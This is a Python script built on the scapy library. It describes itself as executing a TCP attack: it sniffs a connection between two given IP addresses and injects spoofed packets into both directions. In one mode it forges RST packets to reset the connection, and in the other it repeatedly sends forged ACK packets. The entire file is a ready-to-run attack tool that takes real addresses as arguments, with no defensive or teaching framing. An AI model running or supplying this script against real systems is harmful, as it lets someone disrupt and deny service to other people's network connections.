#!/usr/bin/env python
import argparse
import getopt
import sys

from scapy.all import *
from scapy.layers.inet import IP, TCP

def send_ack_packets(dest_ip, source_ip, dest_port, source_port, packet):

    ip1 = IP(src=dest_ip, dst=source_ip)
    TCP_ACK1 = TCP(sport=int(dest_port), dport=int(source_port), flags="A", seq=packet[TCP].seq, ack=packet[TCP].ack)

    ip2 = IP(src=source_ip, dst=dest_ip)
    TCP_ACK2 = TCP(sport=int(source_port), dport=int(dest_port), flags="A", seq=packet[TCP].seq, ack=packet[TCP].ack)

    send(ip1 / TCP_ACK1, count=3, verbose=False)
    send(ip2 / TCP_ACK2, count=3, verbose=False)

def send_rst_packets(dest_ip, source_ip, dest_port, source_port, packet):
    print("Sending RST packets")

    ip1 = IP(src=dest_ip, dst=source_ip)
    TCP_RST1 = TCP(sport=int(dest_port), dport=int(source_port), flags="R", seq=packet[TCP].seq, ack=packet[TCP].ack)
    send(ip1 / TCP_RST1, verbose=False)

    ip2 = IP(src=source_ip, dst=dest_ip)
    TCP_RST2 = TCP(sport=int(source_port), dport=int(dest_port), flags="R", seq=packet[TCP].seq, ack=packet[TCP].ack)
    send(ip2 / TCP_RST2, verbose=False)

def initiate_connection(dest_ip, source_ip, dest_port: str, source_port: str, mode):
    ack_filter = 'src ' + dest_ip + ' and ' \
                 'dst ' + source_ip + ' and ' \
                 'src port ' + dest_port + ' and ' \
                 'dst port ' + source_port + ' and ' \
                 'tcp[13] & 16!=0'

    if(mode == "rst-attack"):
        print("Initiating RST attack")
        t = sniff(filter=ack_filter, prn=lambda pkt: send_rst_packets(dest_ip=dest_ip, source_ip=source_ip, dest_port=dest_port, source_port=source_port, packet=pkt))
    elif(mode == "ack-attack"):
        print("Initiating ACK attack")
        t = sniff(filter=ack_filter, prn=lambda pkt: send_ack_packets(dest_ip=dest_ip, source_ip=source_ip, dest_port=dest_port, source_port=source_port, packet=pkt))

def received_syn_packet(dest_ip, source_ip, mode, packet):
    dest_port = packet[TCP].sport
    source_port = packet[TCP].dport
    initiate_connection(dest_ip, source_ip, str(dest_port), str(source_port), mode)

def main(argv):
    dest_ip = ''
    source_ip = ''
    mode = ''

    parser = argparse.ArgumentParser(description='Execute TCP attack')
    parser.add_argument('--d',
                        metavar='d',
                        type=str,
                        required=True,
                        help="Destination IP")

    parser.add_argument('--s',
                        metavar='s',
                        type=str,
                        required=True,
                        help="Source IP")

    parser.add_argument('--m',
                        metavar='m',
                        type=str,
                        required=True,
                        help="Attack mode: rst-attack or ack-attack")

    args = parser.parse_args()
    dest_ip = args.d
    source_ip = args.s
    mode = args.m

    print('Setting up attack parameters...')
    print('Destination IP: ' + dest_ip)
    print('Source IP: ' + source_ip)
    print('Attack mode: ' + mode)
    print("Awaiting SYN packet...")
    syn_filter = 'ip and src ' + dest_ip + ' and dst ' + source_ip + ' and tcp[13] & 2!=0'
    sniff(count=1, filter=syn_filter, prn=lambda pkt: received_syn_packet(dest_ip, source_ip, mode, pkt))

if __name__ == "__main__":
    main(sys.argv[1:])
